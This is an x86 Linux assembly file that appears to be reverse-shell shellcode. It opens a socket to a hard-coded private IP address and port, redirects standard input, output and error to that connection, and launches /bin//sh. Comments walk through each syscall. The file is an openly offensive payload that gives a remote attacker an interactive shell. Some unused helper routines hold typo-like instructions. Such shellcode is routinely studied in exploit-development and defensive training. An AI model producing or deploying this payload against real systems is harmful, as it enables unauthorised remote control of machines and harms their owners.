
global _start
_cleanUpU:

xor ah , ah
xor bh , bh 
xor ch , bh 
xor dh , dh 
ret

_cleanUpL:
xor al , al
xor bl , bl 
xor cl , bl 
xor dl , dl 
ret

section .text
_start:
push 0x66 
pop eax ;
push 0x1
pop ebx ;sys_socket (0x1) + cleanup ebx
imul edx , edx ,1 
push edx ;protocol=IPPROTO_IP (0x0) 
push ebx ;socket_type=SOCK_STREAM (0x1)
push 0x2 ;socket_family=AF_INET (0x2)
lea ecx, [esp] ;save pointer to socket() args

int 0x80 ;exec sys_socket
MASTER:
xchg edx, eax; save result (sockfd) for later usage
;
; int socketcall(int call, unsigned long *args);
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;
mov al, 0x66

;struct sockaddr_in {
; __kernel_sa_family_t sin_family; /* Address family */
; __be16 sin_port; /* Port number */
; struct in_addr sin_addr; /* Internet address */
;};


push 0x8211A8C0 ; here we used little enddian after conftering our Desired IP ADDRESS to hex formate 
push word 0x0A1A ; Also little endian after convert the port number to hex 
add ebx , 1
push word bx ;sin_family=AF_INET (0x2)
lea cx, [esp] ;save pointer to sockaddr struct

push 0x10 ;addrlen=16
push ecx ;pointer to sockaddr
push edx ;sockfd

mov ecx, esp ;save pointer to sockaddr_in struct

inc ebx ; sys_connect (0x3)

int 0x80 ;exec sys_connect

test eax , eax 
jo MASTER

;
; int socketcall(int call, unsigned long *args);
; int dup2(int oldfd, int newfd);
;
push 0x2
pop ecx ;set loop-counter

xchg ebx,edx ;save sockfd

; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
loop:
mov al, 0x3f ;syscall: sys_dup2 
int 0x80 ;exec sys_dup2
sub ecx , 1 ;decrement loop-counter
jns loop ;as long as SF is not set -> jmp to loop

;
; int execve(const char *filename, char *const argv[],char *const envp[]);
;
mov al, 0x0b ; syscall: sys_execve

inc ecx ;argv=0
mov edx,ecx ;envp=0

push edx ;terminating NULL
push 0x68732f2f ;"hs//"
push 0x6e69622f ;"nib/"

mov ebx, esp ;save pointer to filename

int 0x80 ; exec sys_execve
